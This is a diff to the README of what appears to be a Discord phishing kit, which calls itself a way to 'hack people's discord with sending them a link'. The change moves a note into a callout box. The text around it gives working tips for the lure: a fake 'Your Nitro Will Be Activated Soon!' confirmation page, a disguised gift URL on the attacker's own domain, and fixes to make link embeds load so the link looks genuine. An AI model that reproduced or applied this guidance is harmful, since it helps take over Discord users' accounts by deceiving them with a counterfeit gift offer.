@@ -8,8 +8,10 @@
 > SUPPORT FOR THE REPO HAS BEEN DROPPED IN 2022. FOLLOW UP QUESTIONS WONT BE ANSWERED IN DISCORD
 
 hack people's discord with sending them a link!<br/><br/>
-Note: you can set anything in the file "submited.php".   I recommend you to change the content of it to "Your Nitro Will Be Activated Soon!"
-<br/><br/>
+
+> [!NOTE]
+>Note: you can set anything in the file "submited.php".   I recommend you to change the content of it to "Your Nitro Will Be Activated Soon!"
+
 If you want te send the link with embeds send it like this: www.yourdomain.com/gift/HJ9fh9hGfgfijh93<br/>
 if the embeds didn't load, add a "/" to the link<br/>
 if still is not loading up: add index.html<br/>
